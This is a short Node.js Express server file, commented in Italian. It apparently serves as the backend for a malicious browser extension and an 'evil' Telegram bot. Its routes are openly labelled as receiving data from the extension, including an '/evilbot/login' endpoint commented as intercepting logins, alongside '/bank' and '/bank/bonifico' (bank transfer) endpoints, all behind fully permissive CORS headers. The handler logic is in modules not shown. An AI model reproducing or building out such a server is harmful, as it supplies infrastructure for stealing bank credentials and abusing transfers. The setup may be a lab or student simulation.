
const express = require("express");
const PORT = process.env.PORT || 4040;

const { handler, handlerlogin } = require("./controller");
const {handlerBank, handlerBankBonifico} = require("./bcontroller");
const app = express();


//Gestione del PRE-FLIGHT Request
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*"); 
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "*"); 
  next();
});

app.options("/", (req, res) => {
  res.sendStatus(200); 
});

app.use(express.json());

// POST dal bot Telegram evil
app.post("/evilbot", async (req, res) => {
  console.log("POST ricevuta su EvilBot:", req.body);
  res.send(await handler(req, "POST"));
});

// GET dall'estensione
app.get("/evilbot", async (req, res) => {
  console.log("GET ricevuta su EvilBot:", req.query);
  res.send(await handler(req, "GET"));
});
//GET dall'estensione per intercettare login
app.get("/evilbot/login", async (req, res) => {
  res.send(await handlerlogin(req, "GET"));
});



//Richieste del bot della banca
app.post("/bank", async (req, res) => {
  console.log("POST ricevuta su BANCA:", req.body);
  res.send(await handlerBank(req, "POST"));
});

app.post("/bank/bonifico", async (req, res) => {
  console.log("Bonifico ricevuta su BANCA:", req.body);
  res.send(await handlerBankBonifico(req, "POST"));
});


app.get("/bank", async (req, res) => {
  console.log("GET ricevuta su BANCA:", req.query);
  res.send(await handlerBank(req, "GET"));
});









// Avvio server
app.listen(PORT, (err) => {
  if (err) console.error("Errore:", err);
  console.log("Server listening on PORT", PORT);
});


